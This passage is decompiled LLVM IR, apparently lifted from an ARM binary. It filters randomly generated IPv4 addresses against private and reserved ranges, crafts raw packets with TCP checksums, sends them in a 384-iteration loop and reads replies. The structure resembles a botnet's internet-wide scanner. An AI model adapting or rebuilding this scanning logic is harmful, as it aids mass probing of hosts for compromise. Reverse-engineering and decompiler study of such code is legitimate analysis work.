  store i1 %v7_e568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e568, label %dec_label_pc_e540, label %dec_label_pc_e570

dec_label_pc_e570:                                ; preds = %dec_label_pc_e568
  %v1_e570 = add nsw i32 %v1_e544, -15
  store i32 %v1_e570, i32* %r3.global-to-local, align 4
  %v2_e574 = icmp ugt i32 %v1_e544, 55
  store i1 %v2_e574, i1* %cpsr_c.global-to-local, align 1
  %v7_e574 = icmp eq i32 %v1_e544, 56
  store i1 %v7_e574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e574, label %dec_label_pc_e540, label %bb375

bb375:                                            ; preds = %dec_label_pc_e570
  %v3_e578 = icmp ne i32 %v1_e570, 0
  store i1 %v3_e578, i1* %cpsr_c.global-to-local, align 1
  %v8_e578 = icmp eq i32 %v1_e570, 1
  store i1 %v8_e578, i1* %cpsr_z.global-to-local, align 1
  %v2_e57c = xor i1 %v3_e578, true
  %v3_e57c = or i1 %v8_e578, %v2_e57c
  br i1 %v3_e57c, label %dec_label_pc_e540, label %dec_label_pc_e580

dec_label_pc_e580:                                ; preds = %bb375
  %v2_e580 = icmp ugt i32 %v1_e544, 9
  store i1 %v2_e580, i1* %cpsr_c.global-to-local, align 1
  %v7_e580 = icmp eq i32 %v1_e544, 10
  store i1 %v7_e580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e580, label %dec_label_pc_e540, label %dec_label_pc_e588

dec_label_pc_e588:                                ; preds = %dec_label_pc_e580
  %v2_e588 = icmp ugt i32 %v1_e544, 191
  store i1 %v2_e588, i1* %cpsr_c.global-to-local, align 1
  %v7_e588 = icmp eq i32 %v1_e544, 192
  store i1 %v7_e588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e588, label %bb376, label %dec_label_pc_e594

bb376:                                            ; preds = %dec_label_pc_e588
  %v3_e58c = icmp ugt i32 %v1_e558, 167
  store i1 %v3_e58c, i1* %cpsr_c.global-to-local, align 1
  %v8_e58c = icmp eq i32 %v1_e558, 168
  store i1 %v8_e58c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e58c, label %dec_label_pc_e540, label %dec_label_pc_e594

dec_label_pc_e594:                                ; preds = %dec_label_pc_e588, %bb376
  %v7_e594 = icmp eq i32 %v1_e544, 172
  %.459 = zext i1 %v7_e594 to i32
  store i32 %.459, i32* %r3.global-to-local, align 4
  %v2_e5a0 = icmp ugt i32 %v1_e558, 14
  store i1 %v2_e5a0, i1* %cpsr_c.global-to-local, align 1
  %v7_e5a0 = icmp eq i32 %v1_e558, 15
  store i1 %v7_e5a0, i1* %cpsr_z.global-to-local, align 1
  %v2_e5a4 = xor i1 %v2_e5a0, true
  %v3_e5a4 = or i1 %v7_e5a0, %v2_e5a4
  br i1 %v3_e5a4, label %.thread8, label %bb379

.thread8:                                         ; preds = %dec_label_pc_e594
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e5b8

bb379:                                            ; preds = %dec_label_pc_e594
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e5a8 = icmp eq i1 %v7_e594, false
  store i1 %v2_e5a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e5a8, label %dec_label_pc_e5b8, label %dec_label_pc_e5b0

dec_label_pc_e5b0:                                ; preds = %bb379
  %v2_e5b0 = icmp ugt i32 %v1_e558, 30
  store i1 %v2_e5b0, i1* %cpsr_c.global-to-local, align 1
  %v7_e5b0 = icmp eq i32 %v1_e558, 31
  store i1 %v7_e5b0, i1* %cpsr_z.global-to-local, align 1
  %v2_e5b4 = xor i1 %v2_e5b0, true
  %v3_e5b4 = or i1 %v7_e5b0, %v2_e5b4
  br i1 %v3_e5b4, label %dec_label_pc_e540, label %dec_label_pc_e5b8

dec_label_pc_e5b8:                                ; preds = %.thread8, %dec_label_pc_e5b0, %bb379
  %v7_e5b8 = icmp eq i32 %v1_e544, 100
  %.460 = zext i1 %v7_e5b8 to i32
  store i32 %.460, i32* %r3.global-to-local, align 4
  %v2_e5c4 = icmp ugt i32 %v1_e558, 62
  store i1 %v2_e5c4, i1* %cpsr_c.global-to-local, align 1
  %v7_e5c4 = icmp eq i32 %v1_e558, 63
  store i1 %v7_e5c4, i1* %cpsr_z.global-to-local, align 1
  %v2_e5c8 = xor i1 %v2_e5c4, true
  %v3_e5c8 = or i1 %v7_e5c4, %v2_e5c8
  br i1 %v3_e5c8, label %.thread13, label %bb382

.thread13:                                        ; preds = %dec_label_pc_e5b8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e5dc

bb382:                                            ; preds = %dec_label_pc_e5b8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e5cc = icmp eq i1 %v7_e5b8, false
  store i1 %v2_e5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e5cc, label %dec_label_pc_e5dc, label %dec_label_pc_e5d4

dec_label_pc_e5d4:                                ; preds = %bb382
  %v2_e5d4 = icmp ugt i32 %v1_e558, 125
  store i1 %v2_e5d4, i1* %cpsr_c.global-to-local, align 1
  %v7_e5d4 = icmp eq i32 %v1_e558, 126
  store i1 %v7_e5d4, i1* %cpsr_z.global-to-local, align 1
  %v2_e5d8 = xor i1 %v2_e5d4, true
  %v3_e5d8 = or i1 %v7_e5d4, %v2_e5d8
  br i1 %v3_e5d8, label %dec_label_pc_e540, label %dec_label_pc_e5dc

dec_label_pc_e5dc:                                ; preds = %.thread13, %dec_label_pc_e5d4, %bb382
  %v2_e5dc = icmp ugt i32 %v1_e544, 168
  store i1 %v2_e5dc, i1* %cpsr_c.global-to-local, align 1
  %v7_e5dc = icmp eq i32 %v1_e544, 169
  store i1 %v7_e5dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e5dc, label %bb383, label %dec_label_pc_e5e8

bb383:                                            ; preds = %dec_label_pc_e5dc
  %v3_e5e0 = icmp eq i32 %v1_e558, 255
  store i1 %v3_e5e0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_e5e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e5e0, label %dec_label_pc_e540, label %dec_label_pc_e5e8

dec_label_pc_e5e8:                                ; preds = %dec_label_pc_e5dc, %bb383
  %v7_e5e8 = icmp eq i32 %v1_e544, 198
  %.461 = zext i1 %v7_e5e8 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_e5f4 = icmp ugt i32 %v1_e558, 16
  store i1 %v2_e5f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e5f4 = icmp eq i32 %v1_e558, 17
  store i1 %v7_e5f4, i1* %cpsr_z.global-to-local, align 1
  %v2_e5f8 = xor i1 %v2_e5f4, true
  %v3_e5f8 = or i1 %v7_e5f4, %v2_e5f8
  br i1 %v3_e5f8, label %.thread19, label %bb386

.thread19:                                        ; preds = %dec_label_pc_e5e8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e60c

bb386:                                            ; preds = %dec_label_pc_e5e8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e5fc = icmp eq i1 %v7_e5e8, false
  store i1 %v2_e5fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e5fc, label %dec_label_pc_e60c, label %dec_label_pc_e604

dec_label_pc_e604:                                ; preds = %bb386
  %v2_e604 = icmp ugt i32 %v1_e558, 18
  store i1 %v2_e604, i1* %cpsr_c.global-to-local, align 1
  %v7_e604 = icmp eq i32 %v1_e558, 19
  store i1 %v7_e604, i1* %cpsr_z.global-to-local, align 1
  %v2_e608 = xor i1 %v2_e604, true
  %v3_e608 = or i1 %v7_e604, %v2_e608
  br i1 %v3_e608, label %dec_label_pc_e540, label %dec_label_pc_e60c

dec_label_pc_e60c:                                ; preds = %.thread19, %dec_label_pc_e604, %bb386
  %v2_e60c = icmp ugt i32 %v1_e544, 222
  store i1 %v2_e60c, i1* %cpsr_c.global-to-local, align 1
  %v7_e60c = icmp eq i32 %v1_e544, 223
  store i1 %v7_e60c, i1* %cpsr_z.global-to-local, align 1
  %v2_e610 = xor i1 %v7_e60c, true
  %v3_e610 = and i1 %v2_e60c, %v2_e610
  br i1 %v3_e610, label %dec_label_pc_e540, label %dec_label_pc_e614

dec_label_pc_e614:                                ; preds = %dec_label_pc_e60c
  %v7_e614 = icmp eq i32 %v1_e544, 106
  %.462 = zext i1 %v7_e614 to i32
  %v2_e620 = icmp ugt i32 %v1_e558, 185
  store i1 %v2_e620, i1* %cpsr_c.global-to-local, align 1
  %v7_e620 = icmp eq i32 %v1_e558, 186
  store i1 %v7_e620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e620, label %bb389, label %dec_label_pc_e62c

bb389:                                            ; preds = %dec_label_pc_e614
  %v2_e614 = icmp ugt i32 %v1_e544, 105
  store i1 %v2_e614, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e614, label %dec_label_pc_e540, label %dec_label_pc_e62c

dec_label_pc_e62c:                                ; preds = %dec_label_pc_e614, %bb389
  %v2_e62c = icmp ugt i32 %v1_e558, 186
  store i1 %v2_e62c, i1* %cpsr_c.global-to-local, align 1
  %v7_e62c = icmp eq i32 %v1_e558, 187
  store i1 %v7_e62c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e62c, label %.thread24, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e62c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e640

.thread24:                                        ; preds = %dec_label_pc_e62c
  store i32 %.462, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e638 = icmp eq i1 %v7_e614, false
  store i1 %v2_e638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e638, label %dec_label_pc_e640, label %dec_label_pc_e540

dec_label_pc_e640:                                ; preds = %.thread25, %.thread24
  %v2_e640 = icmp ugt i32 %v1_e558, 184
  store i1 %v2_e640, i1* %cpsr_c.global-to-local, align 1
  %v7_e640 = icmp eq i32 %v1_e558, 185
  store i1 %v7_e640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e640, label %.thread28, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_e640
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e654

.thread28:                                        ; preds = %dec_label_pc_e640
  store i32 %.462, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e64c = icmp eq i1 %v7_e614, false
  store i1 %v2_e64c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e64c, label %dec_label_pc_e654, label %dec_label_pc_e540

dec_label_pc_e654:                                ; preds = %.thread29, %.thread28
  %v2_e654 = icmp ugt i32 %v1_e558, 183
  store i1 %v2_e654, i1* %cpsr_c.global-to-local, align 1
  %v7_e654 = icmp eq i32 %v1_e558, 184
  store i1 %v7_e654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e654, label %.thread32, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_e654
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e668

.thread32:                                        ; preds = %dec_label_pc_e654
  store i32 %.462, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e660 = icmp eq i1 %v7_e614, false
  store i1 %v2_e660, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e660, label %dec_label_pc_e668, label %dec_label_pc_e540

dec_label_pc_e668:                                ; preds = %.thread33, %.thread32
  %v2_e668 = icmp ugt i32 %v1_e544, 149
  store i1 %v2_e668, i1* %cpsr_c.global-to-local, align 1
  %v7_e668 = icmp eq i32 %v1_e544, 150
  store i1 %v7_e668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e668, label %bb390, label %dec_label_pc_e674

bb390:                                            ; preds = %dec_label_pc_e668
  %v3_e66c = icmp ugt i32 %v1_e558, 30
  store i1 %v3_e66c, i1* %cpsr_c.global-to-local, align 1
  %v8_e66c = icmp eq i32 %v1_e558, 31
  store i1 %v8_e66c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e66c, label %dec_label_pc_e540, label %dec_label_pc_e674

dec_label_pc_e674:                                ; preds = %dec_label_pc_e668, %bb390
  %v2_e674 = icmp ugt i32 %v1_e544, 48
  store i1 %v2_e674, i1* %cpsr_c.global-to-local, align 1
  %v7_e674 = icmp eq i32 %v1_e544, 49
  store i1 %v7_e674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e674, label %bb391, label %dec_label_pc_e680

bb391:                                            ; preds = %dec_label_pc_e674
  %v3_e678 = icmp ugt i32 %v1_e558, 50
  store i1 %v3_e678, i1* %cpsr_c.global-to-local, align 1
  %v8_e678 = icmp eq i32 %v1_e558, 51
  store i1 %v8_e678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e678, label %dec_label_pc_e540, label %dec_label_pc_e680

dec_label_pc_e680:                                ; preds = %dec_label_pc_e674, %bb391
  %v2_e680 = icmp ugt i32 %v1_e544, 177
  store i1 %v2_e680, i1* %cpsr_c.global-to-local, align 1
  %v7_e680 = icmp eq i32 %v1_e544, 178
  store i1 %v7_e680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e680, label %bb392, label %dec_label_pc_e68c

bb392:                                            ; preds = %dec_label_pc_e680
  %v3_e684 = icmp ugt i32 %v1_e558, 61
  store i1 %v3_e684, i1* %cpsr_c.global-to-local, align 1
  %v8_e684 = icmp eq i32 %v1_e558, 62
  store i1 %v8_e684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e684, label %dec_label_pc_e540, label %dec_label_pc_e68c

dec_label_pc_e68c:                                ; preds = %dec_label_pc_e680, %bb392
  %v2_e68c = icmp ugt i32 %v1_e544, 159
  store i1 %v2_e68c, i1* %cpsr_c.global-to-local, align 1
  %v7_e68c = icmp eq i32 %v1_e544, 160
  store i1 %v7_e68c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e68c, label %bb393, label %dec_label_pc_e698

bb393:                                            ; preds = %dec_label_pc_e68c
  %v3_e690 = icmp ugt i32 %v1_e558, 12
  store i1 %v3_e690, i1* %cpsr_c.global-to-local, align 1
  %v8_e690 = icmp eq i32 %v1_e558, 13
  store i1 %v8_e690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e690, label %dec_label_pc_e540, label %dec_label_pc_e698

dec_label_pc_e698:                                ; preds = %dec_label_pc_e68c, %bb393
  %v1_e698 = add nsw i32 %v1_e544, -6
  store i32 %v1_e698, i32* %r3.global-to-local, align 4
  %v2_e69c = icmp ugt i32 %v1_e544, 10
  store i1 %v2_e69c, i1* %cpsr_c.global-to-local, align 1
  %v7_e69c = icmp eq i32 %v1_e544, 11
  store i1 %v7_e69c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e69c, label %dec_label_pc_e540, label %bb394

bb394:                                            ; preds = %dec_label_pc_e698
  %v3_e6a0 = icmp ne i32 %v1_e698, 0
  store i1 %v3_e6a0, i1* %cpsr_c.global-to-local, align 1
  %v8_e6a0 = icmp eq i32 %v1_e698, 1
  store i1 %v8_e6a0, i1* %cpsr_z.global-to-local, align 1
  %v2_e6a4 = xor i1 %v3_e6a0, true
  %v3_e6a4 = or i1 %v8_e6a0, %v2_e6a4
  br i1 %v3_e6a4, label %dec_label_pc_e540, label %dec_label_pc_e6a8

dec_label_pc_e6a8:                                ; preds = %bb394
  %v2_e6a8 = icmp ugt i32 %v1_e544, 21
  store i1 %v2_e6a8, i1* %cpsr_c.global-to-local, align 1
  %v7_e6a8 = icmp eq i32 %v1_e544, 22
  store i1 %v7_e6a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6a8, label %dec_label_pc_e540, label %bb395

bb395:                                            ; preds = %dec_label_pc_e6a8
  %v3_e6ac = icmp ugt i32 %v1_e544, 20
  store i1 %v3_e6ac, i1* %cpsr_c.global-to-local, align 1
  %v8_e6ac = icmp eq i32 %v1_e544, 21
  store i1 %v8_e6ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e6ac, label %dec_label_pc_e540, label %dec_label_pc_e6b4

dec_label_pc_e6b4:                                ; preds = %bb395
  %v2_e6b4 = icmp ugt i32 %v1_e544, 27
  store i1 %v2_e6b4, i1* %cpsr_c.global-to-local, align 1
  %v7_e6b4 = icmp eq i32 %v1_e544, 28
  store i1 %v7_e6b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6b4, label %dec_label_pc_e540, label %bb396

bb396:                                            ; preds = %dec_label_pc_e6b4
  %v3_e6b8 = icmp ugt i32 %v1_e544, 25
  store i1 %v3_e6b8, i1* %cpsr_c.global-to-local, align 1
  %v8_e6b8 = icmp eq i32 %v1_e544, 26
  store i1 %v8_e6b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e6b8, label %dec_label_pc_e540, label %dec_label_pc_e6c0

dec_label_pc_e6c0:                                ; preds = %bb396
  %v2_e6c0 = icmp ugt i32 %v1_e544, 29
  store i1 %v2_e6c0, i1* %cpsr_c.global-to-local, align 1
  %v7_e6c0 = icmp eq i32 %v1_e544, 30
  store i1 %v7_e6c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6c0, label %dec_label_pc_e540, label %bb397

bb397:                                            ; preds = %dec_label_pc_e6c0
  %v3_e6c4 = icmp ugt i32 %v1_e544, 28
  store i1 %v3_e6c4, i1* %cpsr_c.global-to-local, align 1
  %v8_e6c4 = icmp eq i32 %v1_e544, 29
  store i1 %v8_e6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e6c4, label %dec_label_pc_e540, label %dec_label_pc_e6cc

dec_label_pc_e6cc:                                ; preds = %bb397
  %v2_e6cc = icmp ugt i32 %v1_e544, 54
  store i1 %v2_e6cc, i1* %cpsr_c.global-to-local, align 1
  %v7_e6cc = icmp eq i32 %v1_e544, 55
  store i1 %v7_e6cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6cc, label %dec_label_pc_e540, label %bb398

bb398:                                            ; preds = %dec_label_pc_e6cc
  %v3_e6d0 = icmp ugt i32 %v1_e544, 32
  store i1 %v3_e6d0, i1* %cpsr_c.global-to-local, align 1
  %v8_e6d0 = icmp eq i32 %v1_e544, 33
  store i1 %v8_e6d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e6d0, label %dec_label_pc_e540, label %dec_label_pc_e6d8

dec_label_pc_e6d8:                                ; preds = %bb398
  %v2_e6d8 = icmp ugt i32 %v1_e544, 214
  store i1 %v2_e6d8, i1* %cpsr_c.global-to-local, align 1
  %v7_e6d8 = icmp eq i32 %v1_e544, 215
  store i1 %v7_e6d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6d8, label %.thread48, label %bb399

bb399:                                            ; preds = %dec_label_pc_e6d8
  %v3_e6dc = icmp ugt i32 %v1_e544, 213
  store i1 %v3_e6dc, i1* %cpsr_c.global-to-local, align 1
  %v8_e6dc = icmp eq i32 %v1_e544, 214
  store i1 %v8_e6dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e6dc, label %bb400, label %dec_label_pc_e6ec

.thread48:                                        ; preds = %dec_label_pc_e6d8
  br label %dec_label_pc_e540

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_e540

dec_label_pc_e6ec:                                ; preds = %bb399
  %v5_e6f8 = call i32 @llvm.bswap.i32(i32 %v0_e540)
  store i32 %v5_e6f8, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_e540, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_e700 = udiv i32 %v5_e6f8, 16777216
  %v1_e704 = and i32 %v5_e6f8, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v4_e708 = udiv i32 %tmp402, 256
  %v4_e70c = mul i32 %v1_e704, 256
  store i32 ptrtoint (i8** @global_var_216f8.149 to i32), i32* @r0, align 4
  %tmp403 = and i32 %v0_e540, 65536
  %v3_e714 = icmp ne i32 %tmp403, 0
  store i1 %v3_e714, i1* %cpsr_c.global-to-local, align 1
  %v4_e714 = mul i32 %v5_e6f8, 16777216
  %v5_e708 = or i32 %v4_e714, %v3_e700
  %v5_e70c = or i32 %v5_e708, %v4_e708
  %v5_e714 = or i32 %v5_e70c, %v4_e70c
  store i32 %v5_e714, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_21702.191 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_e714, i32* @global_var_21708.192, align 4
  %v3_e724 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_216f8.149 to i32), i32 20)
  %v4_e724 = trunc i32 %v3_e724 to i16
  store i32 %v3_e724, i32* %r0.global-to-local, align 4
  %v3_e728 = load i32, i32* %stack_var_-52, align 4
  %v5_e738 = sdiv i32 %v3_e728, 10
  %v3_e73c = mul i32 %v5_e738, 8
  store i32 %v3_e73c, i32* %r2.global-to-local, align 4
  %v2_e744 = mul i32 %v5_e738, 10
  store i32 %v2_e744, i32* %r3.global-to-local, align 4
  %v3_e748 = icmp uge i32 %v3_e728, %v2_e744
  store i1 %v3_e748, i1* %cpsr_c.global-to-local, align 1
  %v9_e748 = icmp eq i32 %v3_e728, %v2_e744
  store i1 %v9_e748, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_216f8.149 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_e748, label %bb404, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_e6ec
  store i32 ptrtoint (i16* @global_var_2170c.152 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_e724, i16* bitcast (i32* @global_var_21702.191 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_216f8.149 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2170c.152 to i32), i32 2) to i16*), align 2
  %v4_e768 = load i32, i32* @global_var_21708.192, align 4
  store i32 %v4_e768, i32* @global_var_21710.194, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb405

bb404:                                            ; preds = %dec_label_pc_e6ec
  store i16 %v4_e724, i16* bitcast (i32* @global_var_21702.191 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_216f8.149 to i32), i32* %r0.global-to-local, align 4
  %v4_e76854 = load i32, i32* @global_var_21708.192, align 4
  store i32 ptrtoint (i16* @global_var_2170c.152 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_e76854, i32* @global_var_21710.194, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2170c.152 to i32), i32 2) to i16*), align 2
  br label %bb405

bb405:                                            ; preds = %.thread60, %bb404
  store i16 0, i16* bitcast (i32* @global_var_2171c.195 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_2170c.152 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_e794 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_216f8.149 to i32), i32 sext (i16 ptrtoint (i16* @global_var_2170c.152 to i16) to i32), i32 5120, i32 20)
  %v7_e794 = trunc i32 %v6_e794 to i16
  store i32 ptrtoint (i8** @global_var_216f8.149 to i32), i32* %r1.global-to-local, align 4
  %v2_e7a0 = load i32, i32* @global_var_24210.147, align 4
  store i16 %v7_e794, i16* bitcast (i32* @global_var_2171c.195 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_e7cc = load i16, i16* @global_var_2170e.157, align 2
  %v4_e7cc = zext i16 %v3_e7cc to i32
  store i32 %v4_e7cc, i32* @lr, align 4
  store i32 %v2_f640, i32* %ip.global-to-local, align 4
  store i32 %v2_e7a0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_e7e8 = call i32 @__libc_sendto(i32 %v2_e7a0, i32 ptrtoint (i8** @global_var_216f8.149 to i32), i32 40, i32 16384, i32 %v2_e510, i32 16)
  store i32 %v7_e7e8, i32* %r0.global-to-local, align 4
  %v3_e7ec = load i32, i32* %stack_var_-52, align 4
  %v1_e7f0 = add i32 %v3_e7ec, 1
  store i32 %v1_e7f0, i32* %r3.global-to-local, align 4
  %v3_e7f4 = icmp ugt i32 %v1_e7f0, 383
  store i1 %v3_e7f4, i1* %cpsr_c.global-to-local, align 1
  %v8_e7f4 = icmp eq i32 %v1_e7f0, 384
  store i1 %v8_e7f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e7f0, i32* %stack_var_-52, align 4
  %v5_e7fc = icmp slt i32 %v1_e7f0, 384
  br i1 %v5_e7fc, label %dec_label_pc_e514, label %dec_label_pc_e800

dec_label_pc_e800:                                ; preds = %bb405
  %v0_e800 = load i32, i32* @r4, align 4
  br label %dec_label_pc_e804

dec_label_pc_e804:                                ; preds = %dec_label_pc_e4f0, %dec_label_pc_e800
  %stack_var_-1876.1 = phi i32 [ %stack_var_-1876.0, %dec_label_pc_e4f0 ], [ %v0_e800, %dec_label_pc_e800 ]
  %v0_e804 = call i32 @__GI___errno_location()
  store i32 %v0_e804, i32* @fp, align 4
  store i32 %v2_e4e8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_e814, i32* @r4, align 4
  br label %dec_label_pc_e818

dec_label_pc_e818:                                ; preds = %dec_label_pc_e8d8, %dec_label_pc_e8d0, %dec_label_pc_e8c8, %dec_label_pc_e8a4, %dec_label_pc_e894, %dec_label_pc_e878, %dec_label_pc_e860, %dec_label_pc_e8c0, %dec_label_pc_e8b4, %dec_label_pc_e858, %dec_label_pc_e990, %dec_label_pc_e804
  %v1_e81c = phi i32 [ %v0_e804, %dec_label_pc_e804 ], [ %v1_e81c.pre.pre, %dec_label_pc_e990 ], [ %v0_e84c, %dec_label_pc_e858 ], [ %v0_e84c, %dec_label_pc_e8b4 ], [ %v0_e84c, %dec_label_pc_e8c0 ], [ %v0_e84c, %dec_label_pc_e860 ], [ %v0_e84c, %dec_label_pc_e878 ], [ %v0_e84c, %dec_label_pc_e894 ], [ %v0_e84c, %dec_label_pc_e8a4 ], [ %v0_e84c, %dec_label_pc_e8c8 ], [ %v0_e84c, %dec_label_pc_e8d0 ], [ %v0_e84c, %dec_label_pc_e8d8 ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_e81c = inttoptr i32 %v1_e81c to i32*
  store i32 0, i32* %v2_e81c, align 4
  %v2_e828 = load i32, i32* @global_var_24210.147, align 4
  store i32 %v2_e828, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_e4e8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e838 = load i32, i32* %ip.global-to-local, align 4
  %v6_e840 = call i32 @__libc_recvfrom(i32 %v2_e828, i32 %v2_e4e8, i32 1514, i32 16384, i32 %v0_e838, i32 %v0_e838)
  store i32 %v6_e840, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e844 = icmp eq i32 %v6_e840, 0
  store i1 %v2_e844, i1* %cpsr_z.global-to-local, align 1
  %tmp406 = icmp slt i32 %v6_e840, 1
  br i1 %tmp406, label %dec_label_pc_e9a0, label %dec_label_pc_e84c

dec_label_pc_e84c:                                ; preds = %dec_label_pc_e818
  %v0_e84c = load i32, i32* @fp, align 4
  %v1_e84c = inttoptr i32 %v0_e84c to i32*
  %v2_e84c = load i32, i32* %v1_e84c, align 4
  store i32 %v2_e84c, i32* %r3.global-to-local, align 4
  %v2_e850 = icmp ugt i32 %v2_e84c, 10
  store i1 %v2_e850, i1* %cpsr_c.global-to-local, align 1
  %v7_e850 = icmp eq i32 %v2_e84c, 11
  store i1 %v7_e850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e850, label %dec_label_pc_e9a0, label %dec_label_pc_e858

dec_label_pc_e858:                                ; preds = %dec_label_pc_e84c
  %v2_e858 = icmp ugt i32 %v6_e840, 38
  store i1 %v2_e858, i1* %cpsr_c.global-to-local, align 1
  %v7_e858 = icmp eq i32 %v6_e840, 39
  store i1 %v7_e858, i1* %cpsr_z.global-to-local, align 1
  %v2_e85c = xor i1 %v2_e858, true
  %v3_e85c = or i1 %v7_e858, %v2_e85c
  br i1 %v3_e85c, label %dec_label_pc_e818, label %dec_label_pc_e860

dec_label_pc_e860:                                ; preds = %dec_label_pc_e858
  store i32 %v2_e4e8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_241f0.57 to i32), i32* %ip.global-to-local, align 4
  %v3_e868 = load i32, i32* %v2_e868, align 4
  store i32 %v3_e868, i32* %r2.global-to-local, align 4
  %v2_e86c = load i32, i32* @global_var_241f0.57, align 4
